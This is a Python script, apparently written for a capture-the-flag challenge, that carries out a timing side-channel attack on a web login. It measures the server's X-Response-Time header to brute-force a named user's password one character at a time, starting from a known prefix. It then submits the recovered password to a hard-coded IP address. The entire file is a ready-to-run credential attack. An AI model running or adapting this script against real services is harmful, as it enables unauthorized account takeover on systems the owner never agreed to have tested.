#!/usr/bin/env python3
import requests
import time
import string

URL = "http://13.250.106.60:5000/"
USERNAME = "trexthedino"
CHARSET = string.ascii_lowercase + string.digits + string.ascii_uppercase + "!@#$%^&*_-"


def get_timing(password):
    """Send login and return X-Response-Time value"""
    r = requests.post(URL, data={"username": USERNAME, "password": password})
    xt = r.headers.get("X-Response-Time", "0ms")
    # Parse the ms value
    return float(xt.replace("ms", "").strip())


# Step 1: First check if timing differs at all
print("=== Baseline check ===")
for _ in range(3):
    t = get_timing("wrong")
    print(f"  'wrong' -> {t}ms")

# Step 2: Try each first character, multiple times for reliability
print("\n=== Brute-forcing character by character ===")
known = "0dAy@2026"
for pos in range(20):  # max password length
    best_char = None
    best_time = 0
    results = {}

    for c in CHARSET:
        attempt = known + c
        times = []
        for _ in range(3):  # average 3 attempts
            t = get_timing(attempt)
            times.append(t)
        avg = sum(times) / len(times)
        results[c] = avg
        if avg > best_time:
            best_time = avg
            best_char = c

    # Sort and show top 5
    sorted_results = sorted(results.items(), key=lambda x: x[1], reverse=True)
    print(f"\nPosition {pos}: Top 5 candidates:")
    for ch, t in sorted_results[:5]:
        marker = " <<<" if ch == sorted_results[0][0] else ""
        print(f"  '{known}{ch}' -> {t:.2f}ms{marker}")

    # Check if winner is significantly higher
    second_best = sorted_results[1][1]
    if best_time - second_best < 0.01:
        print(f"\nNo significant timing difference. Password might be: '{known}'")
        # Try logging in with what we have
        r = requests.post(URL, data={"username": USERNAME, "password": known})
        if (
            "error" not in r.text.lower()
            or "flag" in r.text.lower()
            or "welcome" in r.text.lower()
        ):
            print(f"SUCCESS! Password: '{known}'")
            print(r.text[:500])
        break

    known += best_char
    print(f"  -> Best: '{best_char}' ({best_time:.2f}ms) | Current password: '{known}'")

    # Check if we've found it
    r = requests.post(URL, data={"username": USERNAME, "password": known})
    if (
        "error" not in r.text.lower()
        or "flag" in r.text.lower()
        or "welcome" in r.text.lower()
    ):
        print(f"\n*** SUCCESS! Password: '{known}' ***")
        print(r.text[:500])
        break
